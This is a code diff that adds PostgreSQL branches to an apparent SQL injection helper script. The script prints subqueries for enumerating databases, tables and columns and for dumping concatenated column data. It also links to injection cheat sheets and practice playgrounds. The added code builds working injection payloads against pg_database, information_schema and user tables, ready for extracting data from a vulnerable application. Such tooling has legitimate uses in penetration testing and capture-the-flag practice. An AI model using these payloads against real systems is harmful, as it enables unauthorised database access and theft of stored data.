@@ -99,6 +99,9 @@ elif args.dbs == 'mssql':
 elif args.dbs == 'oracle':
     print("\nPaylods All the Things (oracle): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md")
     print("Practice Online - Playground: https://www.oracle.com/database/technologies/olracle-live-sql.html\n\n")
+elif args.dbs == 'postgres':
+    print("\nPaylods All the Things (postgres): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md")
+    print("Practice Online - Playground: https://pgexercises.com/questions/basic/selectall.html\n\n")
 
 
 
@@ -135,6 +138,17 @@ if (not args.database):
         else:
             columns = "owner"
             source = 'from all_tables'
+    elif args.dbs == 'postgres':
+        print('- Dump current database: SELECT current_database()')
+        prefix = '(SELECT DISTINCT'
+        source = 'FROM pg_database'
+        suffex = ')'
+        if (args.isSingleRowOutput):
+            columns = "STRING_AGG(datname,',')" 
+            # cmd = "(SELECT DISTINCT STRING_AGG(name,',') FROM master..sysdatabases)"
+        else:
+            columns = "datname"
+            # cmd = "(SELECT DISTINCT name FROM master..sysdatabases)"
             
     printCmd(prefix, columns, source, suffex)
 
@@ -172,6 +186,16 @@ if (args.database and not args.table):
         else:
             columns = "table_name"
             source = f"from all_tables where owner = '{args.database}'"
+    elif args.dbs == 'postgres':
+        prefix = '(SELECT DISTINCT'
+        source = f'FROM {args.database}.information_schema.tables'
+        suffex = ')'
+        if (args.isSingleRowOutput):
+            columns = "STRING_AGG(table_schema||'.'||table_name, ',')"
+            # cmd = f"(SELECT DISTINCT STRING_AGG(table_name, ',') FROM {args.database}.information_schema.tables)"
+        else:
+            columns = "table_schema||'.'||table_name"
+            # cmd = f"(SELECT DISTINCT table_name FROM {args.database}.information_schema.tables)"
     printCmd(prefix, columns, source, suffex)
     
 
@@ -210,6 +234,17 @@ if (args.database and args.table and not args.columns):
         else:
             columns = "column_name"
             source = f"FROM all_tab_columns WHERE table_name = '{args.table}' and owner = '{args.database}'"
+    elif args.dbs == 'postgres':
+        schema = args.table.split('.')[0]
+        table = '.'.join(args.table.split('.')[1:])
+
+        prefix = '(SELECT DISTINCT'
+        source = f"FROM {args.database}.information_schema.columns WHERE table_schema = '{schema}' AND table_name = '{table}'"
+        suffex = ')'
+        if (args.isSingleRowOutput):
+            columns = "STRING_AGG(column_name, ',')"
+        else:
+            columns = "column_name"
     printCmd(prefix, columns, source, suffex)
     
 
@@ -237,7 +272,7 @@ if (args.database and args.table and args.columns):
         source = f"FROM {args.database}..{args.table}"
         suffex = ')'
         if (args.isSingleRowOutput):
-            columns = f"STRING_AGG({cmd}, ',')"
+            columns = f"STRING_AGG({cmd},',')"
             # cmd = f"(SELECT STRING_AGG({cmd}, ',') FROM {args.database}..{args.table})"
         else:
             columns = f'{cmd}'
@@ -252,6 +287,16 @@ if (args.database and args.table and args.columns):
             columns = f"LISTAGG({cmd},',')" 
         else:
             columns = f"{cmd}"
+    elif args.dbs == 'postgres':
+        cmd = "||':'||".join(columns)
+
+        prefix = '(SELECT DISTINCT'
+        source = f"FROM {args.database}.{args.table}"
+        suffex = ')'
+        if (args.isSingleRowOutput):
+            columns = f"STRING_AGG({cmd},',')"
+        else:
+            columns = f'{cmd}'
     printCmd(prefix, columns, source, suffex)
     
 
